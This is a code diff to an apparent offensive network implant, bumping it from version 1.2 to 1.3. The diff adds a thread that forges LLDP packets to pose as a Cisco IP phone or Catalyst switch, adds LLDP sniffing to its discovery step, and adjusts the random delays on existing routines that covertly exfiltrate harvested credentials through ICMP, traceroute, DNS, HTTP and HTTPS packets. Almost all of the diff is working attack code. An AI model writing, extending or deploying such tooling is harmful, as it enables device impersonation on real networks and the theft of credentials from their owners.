@@ -24,7 +24,7 @@ sys.stderr = sys.__stderr__
 
 # Me
 __author__ = "Emilio / @ekio_jp"
-__version__ = "1.2"
+__version__ = "1.3"
 
 # Default options OFF
 DEBUG = False
@@ -58,7 +58,6 @@ snmptpl = dirname + 'Cisco_3850-tpl.snmpwalk'
 
 # Temp files
 snmpfake = dirname + 'Cisco_3850-fake.snmpwalk'
-cdpdata = dirname + 'cdp-data.txt'
 dhcpfd = dirname + 'dhcp-details.txt'
 clifd = dirname + 'cli.conf'
 agent = dirname + 'agent.csv'
@@ -197,6 +196,117 @@ class CDPHandler(threading.Thread):
         self.stoprequest.set()
 
 
+class LLDPHandler(threading.Thread):
+    """
+    Class to handle LLDP packets, will start in background and send
+    packets every 30 seconds, pretend to be a Cisco Phone or Switch
+    """
+    def __init__(self, iface, mac, ip, name, port, switch=True):
+        threading.Thread.__init__(self)
+        self.stoprequest = threading.Event()
+        self.iface = iface
+        self.mac = mac
+        self.ip = ip
+        self.name = name
+        self.port = port
+        self.switch = switch
+
+    def run(self):
+        pkteth = Ether()
+        pkteth.dst = '01:80:c2:00:00:0e'
+        pkteth.src = self.mac
+        pkteth.type = 35020
+
+        pktchass = LLDPDUChassisID()
+        pktchass._type = 1
+        pktchass.subtype = 4
+        pktchass._length = 7
+        pktchass.id = self.mac
+
+        pktportid = LLDPDUPortID()
+        pktportid._type = 2
+        pktportid.subtype = 5
+        pktportid.id = self.port[:2] + re.findall(r'[0-9/]+', self.port)[0]
+        pktportid._length = len(pktportid[LLDPDUPortID].id) + 1
+
+        pktttl = LLDPDUTimeToLive()
+        pktttl._type = 3
+        pktttl.ttl = 120
+        pktttl._length = 2
+
+        pktsys = LLDPDUSystemName()
+        pktsys._type = 5
+        pktsys.system_name = self.name
+        pktsys._length = len(pktsys[LLDPDUSystemName].system_name)
+
+        pktdes = LLDPDUSystemDescription()
+        pktdes._type = 6
+
+        if self.switch:
+            pktdes.description = 'Cisco IOS Software, IOS-XE Software,\
+                (CAT3K_CAA-UNIVERSALK9-M), Version 03.03.03SE RELEASE \
+                SOFTWARE (fc2)\nTechnical Support: http://www.cisco.com/tech\
+                support\nCopyright (c) 1986-2014 by Cisco Systems, \
+                Inc.\nCompiled Sun 27-Apr-14 18:33 by prod_rel_team'
+        else:
+            pktdes.description = 'SIP75.8-5-3SR1S'
+
+        pktdes._length = len(pktdes[LLDPDUSystemDescription].description)
+
+        pktport = LLDPDUPortDescription()
+        pktport._type = 4
+        pktport.description = self.port
+        pktport._length = len(pktport[LLDPDUPortDescription].description)
+
+        pktsyscap = LLDPDUSystemCapabilities()
+        pktsyscap._type = 7
+        pktsyscap._length = 4
+        pktsyscap.mac_bridge_available = 1
+        pktsyscap.mac_bridge_enabled = 1
+
+        pktmgt = LLDPDUManagementAddress()
+        pktmgt._type = 8
+        pktmgt._length = 12
+        pktmgt.management_address = (chr(int(self.ip.split('.')[0]))
+                                     + chr(int(self.ip.split('.')[1]))
+                                     + chr(int(self.ip.split('.')[2]))
+                                     + chr(int(self.ip.split('.')[3])))
+        pktmgt._management_address_string_length = 5
+        pktmgt.management_address_subtype = 1
+        pktmgt.interface_numbering_subtype = 3
+        pktmgt.interface_number = long(100)
+        pktmgt._oid_string_length = 0
+        pktmgt.object_id = ''
+
+        pkt8021 = LLDPDUGenericOrganisationSpecific()
+        pkt8021._type = 127
+        pkt8021._length = 6
+        pkt8021.org_code = 32962
+        pkt8021.subtype = 1
+        pkt8021.data = '\x00d'
+
+        pkt8023 = LLDPDUGenericOrganisationSpecific()
+        pkt8023._type = 127
+        pkt8023._length = 9
+        pkt8023.org_code = 4623
+        pkt8023.subtype = 1
+        pkt8023.data = '\x03l\x03\x00\x10'
+
+        pktend = LLDPDUEndOfLLDPDU()
+        pktend[LLDPDUEndOfLLDPDU]._type = 0
+        pktend[LLDPDUEndOfLLDPDU]._length = 0
+
+        pkt = pkteth / pktchass / pktportid / pktttl / pktsys / pktdes \
+            / pktport / pktsyscap / pktmgt / pkt8021 / pkt8023 / pktend
+
+        while not self.stoprequest.isSet():
+            sendp(pkt, iface=self.iface, verbose=0)
+            time.sleep(30)
+
+    def join(self):
+        self.stoprequest.set()
+
+
 class SNMPHandler(threading.Thread):
     """
     Sniff for packets on UDP/161 and extract community into a file
@@ -298,14 +408,13 @@ def grep(fd, pattern):
         return False
 
 
-# If can't find CDP with hostname, setup 'switch01'
 def discover(opciones):
-    fd = open(cdpdata, 'w')
     cli = open(clifd, 'w')
     cdpname = sniff(iface=opciones.nic,
                     filter='ether[20:2] == 0x2000', count=1, timeout=60)
+    lldpname = sniff(iface=opciones.nic,
+                     filter='ether proto 0x88cc', count=1, timeout=60)
     if cdpname:
-        fd.write('cdp,' + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val + '\n')
         cli.write('<CDPNAME>,'
                   + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val + '\n')
         cli.write('<CDPINT>,'
@@ -313,12 +422,12 @@ def discover(opciones):
         cli.write('<CDPMODEL>,'
                   + str(cdpname[0][CDPv2_HDR][CDPMsgPlatform].val).split()[1]
                   + '\n')
-    else:
-        fd.write('cdp,switch01\n')
-        cli.write('<CDPNAME>,sw01\n')
-        cli.write('<CDPINT>,GigaEtherneti1/0/2\n')
-        cli.write('<CDPMODEL>,WS-C3850-48P\n')
-    fd.close()
+    if lldpname:
+        cli.write('<LLDPNAME>,'
+                  + lldpname[0][LLDPDU][LLDPDUSystemName].system_name + '\n')
+        cli.write('<LLDPINT>,'
+                  + lldpname[0][LLDPDU][LLDPDUPortDescription].description
+                  + '\n')
     cli.close()
 
 
@@ -459,6 +568,7 @@ def main():
 
     # Load Scapy modules
     load_contrib("cdp")
+    load_contrib("lldp")
 
     # Bring LAN interface up
     subprocess.call('/sbin/ifconfig ' + iface + ' up', shell=True)
@@ -472,10 +582,10 @@ def main():
 
     # Listen for CDP packets to get hostname from it
     if DEBUG:
-        print('CDP discover started')
+        print('CDP/LLDP discover started')
     discover(opciones)
     if DEBUG:
-        print('CDP discover ended')
+        print('CDP/LLDP discover ended')
 
     # Grab an IP using DHCP
     if DEBUG:
@@ -520,7 +630,8 @@ def main():
         print('ARP gw started')
 
     # Send ARP WHO-HAS to grab MAC from default gateway
-    arppkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=ip, pdst=gwip)
+    arppkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=ip,
+                                                         pdst=gwip)
     sendp(arppkt, iface=iface, verbose=0)
     time.sleep(2)
     arpdh.join()
@@ -545,6 +656,20 @@ def main():
         time.sleep(60)
     cdpdh.join()
 
+    # Fake LLDP for phone
+    lldpdh = LLDPHandler(iface, phonemac, ip, phonename, phoneport, False)
+    lldpdh.daemon = True
+    lldpdh.start()
+    if DEBUG:
+        print('LLDP started - phone')
+    # Stop calling .join() after X seconds (default 60sec)
+    if DEBUG:
+        time.sleep(10)
+        print('LLDPd stoped (60sec) - phone (verbose 10sec)')
+    else:
+        time.sleep(60)
+    lldpdh.join()
+
     # Wait 300sec or more to clear MAC (180sec to clear CDP)
     if DEBUG:
         print('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
@@ -561,8 +686,8 @@ def main():
         print('MAC change ended - switch')
 
     # Search CDP packets from discover()
-    find = re.compile('cdp,(.*)')
-    with open(cdpdata, 'r') as sfile:
+    find = re.compile('[<CDPNAME>|<LLDPNAME>],(.*)')
+    with open(clifd, 'r') as sfile:
         swname = find.findall(sfile.read())
     if swname:
         fakeswname = newname(swname[0])
@@ -579,6 +704,13 @@ def main():
     cdpdh.start()
     if DEBUG:
         print('CDPd started - switch')
+
+    # Start fake LLDP as 'switch'
+    lldpdh = LLDPHandler(iface, switchmac, ip, fakeswname, switchport, True)
+    lldpdh.daemon = True
+    lldpdh.start()
+    if DEBUG:
+        print('LLDP started - phone')
 
     # Create SNMP config for snmposter daemon
     ipnet = str(ipcalc.Network(ip + '/' + netmask).network())
@@ -607,6 +739,7 @@ def main():
         swmaccisco = swcmac[0:4].lower() + '.' + swcmac[4:8].lower()\
             + '.' + swcmac[8:12].lower()
         cli.write('<MAC>,' + swmaccisco + '\n')
+        cli.write('<INT>,' + switchport + '\n')
         cli.write('<NETIP>,' + ipnet + '\n')
         cli.write('<GWIP>,' + gwip + '\n')
         macraw = gwmac.replace(':', '')
@@ -690,6 +823,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # second pkt (amount of pkts)
                             del pingpkt[IP].chksum
@@ -703,6 +838,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # paylod pkts
                             for x in range(len(ar)):
@@ -716,6 +853,8 @@ def main():
                                 # random delay
                                 if not DEBUG:
                                     time.sleep(random.randint(1, 30))
+                                else:
+                                    time.sleep(random.randint(1, 10))
 
                         # Traceroute exfiltration
                         # Use [IP].id 200+len and [IP].id 300+amount of pkts
@@ -740,6 +879,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # second pkt (amount of pkts)
                             trcpkt[IP].id = 300 + len(ar)
@@ -751,6 +892,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # payload pkts
                             for x in range(len(ar)):
@@ -765,6 +908,8 @@ def main():
                                 sendp(trcpkt, iface=iface, verbose=0)
                                 # random delay
                                 if not DEBUG:
+                                    time.sleep(random.randint(1, 30))
+                                else:
                                     time.sleep(random.randint(1, 30))
 
                         # DNS exfiltration
@@ -827,6 +972,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # second pkt (amount of pkts)
                             del httppkt[IP].chksum
@@ -838,6 +985,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # payload pkts
                             for x in range(len(ar)):
@@ -850,6 +999,8 @@ def main():
                                 # random delay
                                 if not DEBUG:
                                     time.sleep(random.randint(1, 30))
+                                else:
+                                    time.sleep(random.randint(1, 10))
 
                         # HTTPS/SSL exfiltration
                         # We don't neeed a fully TCP/3WAY, just a few SYN
@@ -890,6 +1041,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # second pkt (amount of pkts)
                             del httpspkt[IP].chksum
@@ -901,6 +1054,8 @@ def main():
                             # random delay
                             if not DEBUG:
                                 time.sleep(random.randint(1, 30))
+                            else:
+                                time.sleep(random.randint(1, 10))
 
                             # payload pkts
                             for x in range(len(ar)):
@@ -913,11 +1068,13 @@ def main():
                                 # random delay
                                 if not DEBUG:
                                     time.sleep(random.randint(1, 30))
+                                else:
+                                    time.sleep(random.randint(1, 10))
 
                 # Define interval between exfiltration (per line of cred file)
                 if DEBUG:
-                    print('Credentials by line 300sec interval (10s verbose)')
-                    time.sleep(10)
+                    print('Credentials by line 300sec interval (30s verbose)')
+                    time.sleep(30)
                 else:
                     time.sleep(300)
 
